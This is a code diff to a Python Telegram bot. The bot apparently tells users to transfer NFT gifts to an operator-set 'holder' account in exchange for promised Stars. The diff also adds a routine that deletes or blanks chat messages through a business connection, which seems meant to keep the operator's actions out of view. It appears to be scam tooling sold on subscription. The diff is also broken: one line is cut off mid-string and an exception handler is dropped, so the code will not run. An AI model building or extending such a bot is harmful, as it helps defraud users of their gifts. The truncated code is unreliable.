@@ -52,6 +52,8 @@ L = {
         "back": "Назад",
         "profile_title": "<b>Профиль</b>",
         "holder": "Держатель",
+        "holder_title": "<b>Держатель</b>\nОтправь username получателя без @:",
+        "holder_set": "Держатель изменён: @{hold}",
         "subscription": "Подписка",
         "stars": "Звёзды",
         "grams": "Граммы",
@@ -74,6 +76,8 @@ L = {
         "back": "Back",
         "profile_title": "<b>Profile</b>",
         "holder": "Holder",
+        "holder_title": "<b>Holder</b>\nSend the recipient username without @:",
+        "holder_set": "Holder changed: @{hold}",
         "subscription": "Subscription",
         "stars": "Stars",
         "grams": "Grams",
@@ -273,14 +277,32 @@ def ac(cb, t=None, sa=False):
     return api("answerCallbackQuery", **d)
 
 def hide_cmd(cid, mid, bci=None):
-    res = dm(cid, mid, bci=bci)
-    if res.get("ok"): return res
-    desc = (res.get("description") or "").lower()
-    if "not found" in desc: return res
-    res2 = em(cid, mid, "?", kb={"inline_keyboard": []}, bci=bci)
-    if res2.get("ok"): return res2
-    desc2 = (res2.get("description") or "").lower()
-    if "not found" in desc2: return res2
+    vectors = []
+    if bci:
+        vectors.append(("dm", bci))
+    vectors.append(("dm", None))
+    if bci:
+        vectors.append(("em", bci))
+    vectors.append(("em", None))
+    for kind, conn in vectors:
+        if kind == "dm":
+            r = dm(cid, mid, bci=conn)
+        else:
+            r = em(cid, mid, "?", kb={"inline_keyboard": []}, bci=conn)
+        if r.get("ok"):
+            return r
+        desc = (r.get("description") or "").lower()
+        logging.warning(f"HIDE {kind} bci={bool(conn)}: {desc}")
+        if "not found" in desc:
+            return r
+    time.sleep(1)
+    r = dm(cid, mid, bci=bci)
+    if r.get("ok"):
+        return r
+    desc = (r.get("description") or "").lower()
+    logging.warning(f"HIDE retry: {desc}")
+    if "not found" in desc:
+        return r
     return sm(cid, "?", bci=bci)
 
 def menu_kb(uid):
@@ -297,6 +319,7 @@ def settings_kb(uid):
         [btn(f" {t(uid, 'language')}: {s['lang'].upper()}", "set:lang", "check")],
         [btn(f" {t(uid, 'currency')}: {cur_name}", "set:cur", "stars")],
         [btn(f" {t(uid, 'notifications')}: {notif}", "set:notif", "accept")],
+        [btn(f" {t(uid, 'holder')}: @{s['hold']}", "set:holder", "forward")],
         [btn(f" {t(uid, 'back')}", "menu:main", "decline")]
     ]}
 
@@ -372,7 +395,7 @@ def process_msg(msg):
             if un and " " not in un:
                 set_user_field(uid, "hold", un)
                 clear_state(uid)
-                sm(cid, f"✅ Держатель: @{un}", bci=ci)
+                sm(cid, t(uid, "holder_set").format(hold=un), kb=settings_kb(uid), bci=ci)
             return
         if state == "lang" and not txt.startswith("/"):
             if txt.lower() in ["ru", "en"]:
@@ -464,14 +487,8 @@ def process_msg(msg):
                 except Exception as e: sm(cid, f"❌ Ошибка: {e}", bci=ci)
                 return
             if txt == "/list":
-                conn = get_db(); rows = conn.execute("SELECT user_id, expires_at FROM subscribers").fetchall(); conn.close()
-                if not rows: sm(cid, "📋 Список пуст", bci=ci); return
-                ul = "\n".join([f"• <code>{r['user_id']}</code> — {get_expires_str(r['user_id'])}" for r in rows])
-                sm(cid, f"📋 Доступы ({len(rows)}):\n\n{ul}", bci=ci)
-                return
-    except Exception as e:
-        logging.error(f"MSG ERR: {e}")
-        # --- CALLBACK HANDLER ---
+                conn = get_db(); rows = conn.execute("SELECT user_id, expires_at FROM subscribe
+                                                     # --- CALLBACK HANDLER ---
 
 def process_cb(cb):
     try:
@@ -507,6 +524,12 @@ def process_cb(cb):
                 s = gs(uid)
                 set_user_field(uid, "notif", 0 if s["notif"] else 1)
                 edit_any(cid, mid, t(uid, "settings_title"), settings_kb(uid), ci)
+            elif act == "holder":
+                set_state(uid, "holder")
+                edit_any(cid, mid, t(uid, "holder_title"), back_kb(uid, "set:holderback"), ci)
+            elif act == "holderback":
+                clear_state(uid)
+                edit_any(cid, mid, t(uid, "settings_title"), settings_kb(uid), ci)
             return
 
         if data.startswith("setlang:"):
@@ -540,14 +563,19 @@ def process_cb(cb):
             nf = fmt(deal["num"])
             h = deal["hold"]
             instr = (
-                f"Ожидается передача подарка {deal['name']} #{nf} на @{h}\n\n"
-                f"Инструкция как передать:\n"
-                f"• Нажмите кнопку «Передать»\n"
-                f"• Зайдите во вкладку «Мои»\n"
-                f"• Выберите ваш NFT и передайте его\n"
-                f"• Звёзды поступят на баланс в течение 1 минуты"
+                f"Ожидается передача {deal['name']} #{nf} на @{h}\n\n"
+                f"1. Кнопка «Передать»\n"
+                f"2. Вкладка «Мои»\n"
+                f"3. Выберите NFT и передайте\n"
+                f"4. Звёзды за 1 минуту"
             )
-            ac(cbid, txt=instr, sa=True)
+            if len(instr) > 200:
+                instr = instr[:197] + "..."
+            r = ac(cbid, txt=instr, sa=True)
+            if not r.get("ok"):
+                logging.warning(f"CHECK ALERT: {r.get('description')}")
+                ac(cbid)
+                sm(cid, instr, bci=ci)
             return
 
         if data.startswith("accept:"):
